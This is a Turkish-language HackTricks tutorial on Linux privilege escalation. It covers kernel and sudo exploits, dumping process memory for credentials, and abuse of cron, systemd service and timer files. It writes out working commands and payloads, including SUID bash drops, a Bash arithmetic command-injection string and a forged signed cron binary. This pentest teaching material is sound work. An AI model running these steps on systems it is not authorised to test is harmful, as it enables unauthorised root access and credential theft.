# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### İşletim Sistemi bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkeni içindeki herhangi bir klasörde yazma iznine sahipseniz** bazı kütüphaneleri veya binary'leri hijack edebilirsiniz:
```bash
echo $PATH
```
### Env info

Ortam değişkenlerinde ilginç bilgiler, şifreler veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve escalate privileges için kullanılabilecek bir exploit olup olmadığını araştırın.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir vulnerable kernel listesi ve zaten derlenmiş bazı **exploits** burada bulunuyor: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Derlenmiş **exploits** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu web sitesinden tüm vulnerable kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploit aramalarında yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim üzerinde çalıştırın, yalnızca kernel 2.x için exploitleri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıda görünen zafiyetli sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
Bu grep komutunu kullanarak sudo sürümünün güvenlik açığına sahip olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo sürümleri 1.9.17p1'den önceki (**1.9.14 - 1.9.17 < 1.9.17p1**) kullanıcı tarafından kontrol edilen bir dizinden `/etc/nsswitch.conf` dosyası kullanıldığında, sudo `--chroot` seçeneği aracılığıyla ayrıcalıksız yerel kullanıcıların root ayrıcalıklarını yükseltmesine izin verir.

Bu [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) söz konusu [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)'ı istismar etmek içindir. Exploit'i çalıştırmadan önce, `sudo` sürümünüzün etkilenebilir olduğunu ve `chroot` özelliğini desteklediğinden emin olun.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

**smasher2 box of HTB**'yi, bu vuln'ün nasıl istismar edilebileceğine dair bir **örnek** için inceleyin.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listele

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Eğer bir container içindeyseniz, önce aşağıdaki container-security bölümünden başlayın ve ardından runtime-specific abuse sayfalarına pivot yapın:


{{#ref}}
container-security/
{{#endref}}

## Sürücüler

Hangi şeylerin **mounted** ve **unmounted** olduğunu, nerede ve nedenini kontrol edin. Eğer bir şey **unmounted** ise, onu **mount** etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Yararlı yazılımlar

Kullanışlı binaries'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin yüklü olup olmadığını kontrol edin**. Bu, bazı kernel exploit'lerini kullanmanız gerektiğinde faydalıdır çünkü bunları kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kurulu Kırılgan Yazılımlar

Kurulu paketlerin ve servislerin **sürümlerini** kontrol edin. Belki örneğin eski bir Nagios sürümü vardır; bu, escalating privileges için exploit edilebilir…\
Daha şüpheli görünen kurulu yazılımların sürümlerinin elle kontrol edilmesi önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Eğer makineye SSH erişiminiz varsa, içinde yüklü olan güncel olmayan ve güvenlik zafiyeti olan yazılımları kontrol etmek için **openVAS**'ı da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğunlukla yararsız olacak çok fazla bilgi göstereceğini unutmayın; bu nedenle kurulu herhangi bir yazılım sürümünün bilinen exploits'lere karşı zafiyet taşıyıp taşımadığını kontrol edecek OpenVAS veya benzeri uygulamaların kullanılması önerilir_

## Süreçler

Çalıştırılan **hangi işlemlerin** olduğunu inceleyin ve herhangi bir işlemin olması gerekenden **daha fazla yetkiye** sahip olup olmadığını kontrol edin (örneğin root tarafından çalıştırılan bir tomcat olabilir mi?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** bunları, sürecin komut satırındaki `--inspect` parametresini kontrol ederek tespit eder.\
Ayrıca **check your privileges over the processes binaries**, belki birini overwrite edebilirsiniz.

### Süreç izleme

[**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları süreçleri izlemek için kullanabilirsiniz. Bu, sık çalıştırılan veya belirli gereksinimler karşılandığında yürütülen savunmasız süreçleri tespit etmek için çok faydalı olabilir.

### Süreç belleği

Bazı sunucu servisleri **kimlik bilgilerini belleğin içinde düz metin olarak** saklar.\
Normalde diğer kullanıcılara ait süreçlerin belleğini okumak için **root privileges** gerekir, bu yüzden bu genellikle zaten root olduğunuzda daha fazla credential keşfetmek için daha faydalıdır.\
Ancak unutmayın ki **normal bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Günümüzde çoğu makinenin varsayılan olarak ptrace'e izin vermediğini unutmayın; bu, ayrıcalıksız kullanıcınıza ait diğer süreçleri dump edemeyeceğiniz anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace erişilebilirliğini kontrol eder:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. Bu ptrace'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Eğer örneğin bir FTP servisine ait belleğe erişiminiz varsa, Heap'i elde edip içinde credentials arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir process ID için, **maps**, o işlemin sanal adres alanında belleğin nasıl eşlendiğini gösterir; ayrıca **her eşlenmiş bölgenin izinlerini** gösterir. **mem** sahte dosyası **işlemin belleğinin kendisini açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir olduğunu** ve bunların offset'lerini biliriz. Bu bilgiyi **mem** dosyasında seek yapıp tüm okunabilir bölgeleri dump etmek için kullanırız.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubu tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump için linux

ProcDump, Sysinternals suite'inde yer alan Windows için klasik ProcDump aracının Linux üzerinde yeniden tasarlanmış halidir. Şuradan edinebilirsiniz: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlem belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Manuel olarak root gereksinimlerini kaldırabilir ve size ait işlemi dökebilirsiniz
- Script A.5 için [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer authenticator işleminin çalıştığını tespit ederseniz:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Bir process'i dump edebilir (farklı process memory dump yöntemlerini bulmak için önceki bölümlere bakın) ve memory içinde credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) bellekten **düz metin kimlik bilgilerini çalacak** ve bazı **iyi bilinen dosyalardan** alacaktır. Doğru çalışabilmesi için root ayrıcalıkları gerektirir.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işleri

### Crontab UI (alseambusher) root olarak çalışıyor – web tabanlı zamanlayıcı privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve sadece loopback'e bağlıysa, yine de SSH yerel port-yönlendirmesi ile ona erişip ayrıcalıklı bir görev oluşturarak privesc gerçekleştirebilirsiniz.

Tipik zincir
- Sadece loopback'e bağlı portu (örn. 127.0.0.1:8000) ve Basic-Auth realm'ini `ss -ntlp` / `curl -v localhost:8000` ile keşfedin
- Kimlik bilgilerini operasyonel artefaktlarda bulun:
  - Yedekler/scriptler `zip -P <password>`
  - systemd unit'ında `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tünelle bağlanıp giriş yapın:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir iş oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```
Sertleştirme
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve minimum izinlerle sınırlandırın
- localhost'a bağlayın ve ek olarak erişimi firewall/VPN ile kısıtlayın; şifreleri tekrar kullanmayın
- unit dosyalarına gizli bilgileri gömmekten kaçının; secret stores veya sadece root erişimli EnvironmentFile kullanın
- İstek üzerine çalıştırılan görevler için audit/logging'i etkinleştirin



Zamanlanmış herhangi bir görevin zafiyetli olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizine belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH şu şekilde bulunur: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"ın /home/user üzerinde yazma ayrıcalığına sahip olduğuna dikkat edin_)

Eğer bu crontab içinde root kullanıcısı PATH ayarlamadan bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\

Böylece aşağıyı kullanarak root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Eğer root tarafından çalıştırılan bir scriptin bir komutunda “**\***” varsa, bunu beklenmedik şeyler (ör. privesc) için suistimal edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard şu şekilde bir yolun önündeyse** _**/some/path/\***_ **, zafiyete açık değildir (hatta** _**./\***_ **de değildir).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, parameter expansion ve command substitution'ı ((...)), $((...)) ve let içindeki arithmetic evaluation'dan önce gerçekleştirir. Eğer root cron/parser, untrusted log alanlarını okuyup bunları bir arithmetic context'e sokarsa, bir attacker command substitution $(...) enjekte edebilir; bu da cron çalıştığında root olarak çalıştırılır.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Tipik zafiyetli örnek:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- İstismar: Parsed log'a attacker-controlled metin yazdırın ki sayısal görünen alan bir command substitution içersin ve bir rakamla bitsin. Komutunuzun stdout'a yazmadığından emin olun (veya çıktıyı yönlendirin) ki arithmetic geçerli kalır.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer root tarafından çalıştırılan bir cron script'ini **değiştirebiliyorsanız**, çok kolay bir şekilde shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script **sizin tam erişiminizin olduğu directory** kullanıyorsa, o klasörü silip **başka bir folder'a işaret eden bir symlink folder oluşturmak** ve buradan sizin kontrolünüzdeki bir script'i serve etmek faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink doğrulaması ve daha güvenli dosya işlemleri

Yol ile dosya okuyan veya yazan ayrıcalıklı scripts/binaries'i incelerken, linklerin nasıl işlendiğini doğrulayın:

- `stat()` bir symlink'i takip eder ve hedefin metadata'sını döndürür.
- `lstat()` linkin kendisinin metadata'sını döndürür.
- `readlink -f` ve `namei -l` nihai hedefi çözmeye yardımcı olur ve her yol bileşeninin izinlerini gösterir.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Defenders/developers için symlink hilelerine karşı daha güvenli yaklaşımlar şunlardır:

- `O_EXCL` with `O_CREAT`: yol zaten mevcutsa başarısız olur (attacker tarafından önceden oluşturulmuş links/files'ı engeller).
- `openat()`: güvenilen bir dizin file descriptor'ına göre işlem yapın.
- `mkstemp()`: geçici dosyaları güvenli izinlerle atomik olarak oluşturun.

### Yazılabilir payload'lara sahip özel imzalı cron binary'leri
Blue team'ler bazen cron tarafından çalıştırılan binary'leri özel bir ELF bölümü döküp vendor string'i grep'leyerek root olarak çalıştırmadan önce "sign" ederler. Eğer bu binary group-writable ise (ör. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) ve signing material'ı leak edebiliyorsanız, bölümü taklit edip cron görevini ele geçirebilirsiniz:

1. Doğrulama akışını yakalamak için `pspy` kullanın. In Era, root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` çalıştırdı, ardından `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` ve sonra dosyayı çalıştırdı.
2. Beklenen sertifikayı leaked key/config kullanarak yeniden oluşturun (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Kötü amaçlı bir ikame oluşturun (örn., bir SUID bash bırakmak, SSH anahtarınızı eklemek) ve sertifikayı `.text_sig` içine ekleyin ki grep başarılı olsun:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Çalıştırılabilir bitleri koruyarak zamanlanmış binary'nin üzerine yazın:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron çalışmasını bekleyin; basit imza kontrolü başarılı olduğunda payload'ınız root olarak çalışır.

### Frequent cron jobs

Her 1, 2 veya 5 dakikada çalıştırılan prosesleri aramak için prosesleri izleyebilirsiniz. Belki bundan faydalanıp yetki yükseltmesi yapabilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izlemek**, **en az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şu komutu kullanabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her süreci izler ve listeler).

### Saldırganın ayarladığı mode bitlerini koruyan root yedekleri (pg_basebackup)

Eğer root sahibi bir cron, yazabildiğiniz bir veritabanı dizinine karşı `pg_basebackup` (veya herhangi bir recursive copy) çalıştırıyorsa, yedek çıktısına aynı mode bitleriyle **root:root** olarak yeniden kopyalanacak bir **SUID/SGID binary** yerleştirebilirsiniz.

Tipik keşif akışı (düşük ayrıcalıklı DB kullanıcısı olarak):
- `pspy` kullanarak her dakika `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` gibi bir komutu çağıran root cron'u tespit edin.
- Kaynak cluster'ın (örn. `/var/lib/postgresql/14/main`) sizin tarafınızdan yazılabilir olduğunu ve işi takiben hedefin (`/opt/backups/current`) root tarafından sahiplenildiğini doğrulayın.

İstismar:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Bu, `pg_basebackup` cluster'ı kopyalarken dosya mod bitlerini koruduğu için çalışır; root tarafından çağrıldığında hedef dosyalar **root ownership + attacker-chosen SUID/SGID** miras alır. İzinleri koruyan ve yürütülebilir bir konuma yazan benzer herhangi bir ayrıcalıklı yedekleme/kopyalama rutini savunmasızdır.

### Görünmez cron job'lar

Bir yorumdan sonra (yeni satır karakteri olmadan) **putting a carriage return after a comment** koyarak bir cronjob oluşturmak mümkündür ve cron job çalışır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

`.service` dosyalarına yazıp yazamadığınızı kontrol edin, yazabiliyorsanız onu **değiştirebilirsiniz** böylece servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor**'unuz **çalıştırılır** (muhtemelen makine yeniden başlatılana kadar beklemeniz gerekir).\
Örneğin `.service` dosyasının içine **`ExecStart=/tmp/script.sh`** ile backdoor'unuzu oluşturun

### Yazılabilir servis ikili dosyaları

Aklınızda bulundurun ki eğer **servisler tarafından çalıştırılan ikili dosyalar üzerinde yazma izinleriniz varsa**, bunları backdoor koymak için değiştirebilirsiniz; böylece servisler yeniden çalıştırıldığında backdoorlar çalıştırılır.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **write** yazabildiğinizi fark ederseniz, **escalate privileges** mümkün olabilir. Aşağıdaki gibi **relative paths being used on service configurations** dosyalarını aramalısınız:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Daha sonra, yazma izniniz olan systemd PATH klasörü içine, göreli yol binary ile aynı ada sahip bir **executable** oluşturun; servis savunmasız eylemi gerçekleştirmesi istendiğinde (**Start**, **Stop**, **Reload**), sizin **backdoor**'unuz çalıştırılacaktır (ayrıcalıksız kullanıcılar genellikle servisleri başlat/durduramaz ama `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service`'e bakın.**

## **Timers**

**Timers**, adı **.timer** ile biten ve **.service** dosyalarını veya olayları kontrol eden systemd unit dosyalarıdır. **Timers**, takvim zamanlı olaylar ve monotonik zaman olayları için yerleşik destek sağladıkları ve eşzamansız çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm timer'ları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Eğer bir zamanlayıcıyı değiştirebiliyorsanız, mevcut bazı systemd.unit'leri (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Belgelerde Unit'in ne olduğu şöyle yazıyor:

> Timer sona erdiğinde etkinleştirilecek Unit. Argüman, son eki not ".timer" olan bir unit adıdır. Belirtilmemişse, bu değer varsayılan olarak timer unit ile aynı ada sahip bir service olur; fark sadece son ektir. (Yukarıya bakın.) Etkinleştirilen unit adı ile timer unit adı'nın yalnızca son ek dışında aynı adla isimlendirilmesi önerilir.

Bu nedenle, bu izni kötüye kullanmak için şunları yapmanız gerekir:

- Bir systemd unit (örn. `.service`) bulun ve bunun **yazılabilir bir binary çalıştırdığını** doğrulayın
- Bir systemd unit bulun ve bunun **relative path çalıştırdığını**; ayrıca **systemd PATH** üzerinde **yazılabilir ayrıcalıklarınızın** olduğunu doğrulayın (o executable'ı taklit etmek için)

**timers hakkında daha fazla bilgi için `man systemd.timer`'a bakın.**

### **Timer Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına ihtiyacınız vardır ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) istemci-sunucu modellerinde aynı veya farklı makineler arasında **süreç iletişimini** sağlar. Bunlar bilgisayarlar arası iletişim için standart Unix dosya tanımlayıcılarını kullanır ve `.socket` dosyalarıyla yapılandırılır.

Sockets `.socket` dosyaları kullanılarak yapılandırılabilir.

**Learn more about sockets with `man systemd.socket`.** Bu dosyanın içinde, yapılandırılabilecek birkaç ilginç parametre vardır:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak özet olarak **socket'in nerede dinleyeceğini belirtmek** için kullanılır (AF_UNIX socket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, **gelen her bağlantı için bir service instance başlatılır** ve yalnızca bağlantı soketi ona geçirilir. Eğer **false** ise, tüm dinleme soketleri **başlatılan service unit'e geçirilir**, ve tüm bağlantılar için yalnızca bir service unit oluşturulur. Bu değer, tek bir service unit'un koşulsuz olarak tüm gelen trafiği yönettiği datagram soketleri ve FIFO'lar için yok sayılır. **Varsayılan olarak false'tur**. Performans nedenleriyle, yeni daemon'ların sadece `Accept=no` için uygun şekilde yazılması tavsiye edilir.
